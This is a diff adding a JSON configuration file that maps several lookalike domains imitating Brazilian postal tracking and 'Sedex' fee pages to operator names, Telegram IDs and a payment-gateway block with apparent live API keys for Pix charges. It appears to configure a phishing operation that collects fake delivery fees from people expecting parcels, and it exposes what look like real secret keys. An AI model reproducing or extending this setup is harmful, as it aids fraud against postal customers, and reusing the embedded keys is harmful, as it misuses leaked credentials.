@@ -1,0 +1,85 @@
+{
+    "127.0.0.1:5004": {
+        "admin_id": "666b6a902cc8dda2827511a1",
+        "categoria": "correios",
+        "telegramId": "627bf1676e171afddca5c624",
+        "usuario":"pivete_ltda"
+    },
+    "ww1.rastreiodigital.site": {
+        "admin_id": "666b6a902cc8dda2827511a1",
+        "categoria": "correios",
+        "telegramId": "627bf1676e171afddca5c624",
+        "usuario":"pivete_ltda",
+        "taxas": {
+            "api_url":"https://api.webgatepay.com/api/v1/transactions",
+            "api":"YXRfN3E5aGtvRElCTF9yTDBBRUcyN0dKQU5qUklDIUFPMlQzT1BSaTAxVnFWbUgzNDI1",
+            "paymentMethod":"pix"
+        }
+    },
+    "ww1.rastreiacorreio.site": {
+        "admin_id": "666b6a902cc8dda2827511a1",
+        "categoria": "correios",
+        "telegramId": "627bf1676e171afddca5c624",
+        "usuario":"pivete_ltda_rastreiodigital_site",
+        "taxas": {
+            "api_url":"https://api.webgatepay.com/api/v1/transactions",
+            "api":"YXRfN3E5aGtvRElCTF9yTDBBRUcyN0dKQU5qUklDIUFPMlQzT1BSaTAxVnFWbUgzNDI1",
+            "paymentMethod":"pix"
+        }
+    },
+    "ww1.sedextaxas.site": {
+        "admin_id": "666b6a902cc8dda2827511a1",
+        "categoria": "correios",
+        "telegramId": "627bf1676e171afddca5c624",
+        "usuario":"pivete_ltda",
+        "taxas": {
+            "api_url":"https://api.webgatepay.com/api/v1/transactions",
+            "api":"YXRfN3E5aGtvRElCTF9yTDBBRUcyN0dKQU5qUklDIUFPMlQzT1BSaTAxVnFWbUgzNDI1",
+            "paymentMethod":"pix"
+        }
+    },
+    "ww1.rastreiosedex.site": {
+        "admin_id": "666b6a902cc8dda2827511a1",
+        "categoria": "correios",
+        "telegramId": "627bf1676e171afddca5c624",
+        "usuario":"pivete_ltda",
+        "taxas": {
+            "api_url":"https://api.webgatepay.com/api/v1/transactions",
+            "api":"YXRfN3E5aGtvRElCTF9yTDBBRUcyN0dKQU5qUklDIUFPMlQzT1BSaTAxVnFWbUgzNDI1",
+            "paymentMethod":"pix"
+        }
+    },
+    "ww2.rastreiovalida.site": {
+        "usuario":"cabeludo",
+        "admin_id": "666b6a902cc8dda2827511a1",
+        "categoria": "correios",
+        "telegramId": "627bf1676e171afddca5c624",
+        "taxas": {
+            "api_url":"https://api.webgatepay.com/api/v1/transactions",
+            "api":"YXRfNEozRDJnejg5R0FUNDZDWDR3UElGZ29wRzdWbVh0S1lTVlJ5TEs3SEpM",
+            "paymentMethod":"pix"
+        }
+    },
+    "ww2.sedextaxa.site": {
+        "usuario":"cabeludo",
+        "admin_id": "666b6a902cc8dda2827511a1",
+        "categoria": "correios",
+        "telegramId": "627bf1676e171afddca5c624",
+        "taxas": {
+            "api_url":"https://api.webgatepay.com/api/v1/transactions",
+            "api":"YXRfNEozRDJnejg5R0FUNDZDWDR3UElGZ29wRzdWbVh0S1lTVlJ5TEs3SEpM",
+            "paymentMethod":"pix"
+        }
+    },
+    "ww2.rastreiasedex.site": {
+        "usuario":"cabeludo",
+        "admin_id": "666b6a902cc8dda2827511a1",
+        "categoria": "correios",
+        "telegramId": "627bf1676e171afddca5c624",
+        "taxas": {
+            "api_url":"https://api.webgatepay.com/api/v1/transactions",
+            "api":"YXRfNEozRDJnejg5R0FUNDZDWDR3UElGZ29wRzdWbVh0S1lTVlJ5TEs3SEpM",
+            "paymentMethod":"pix"
+        }
+    }
+}
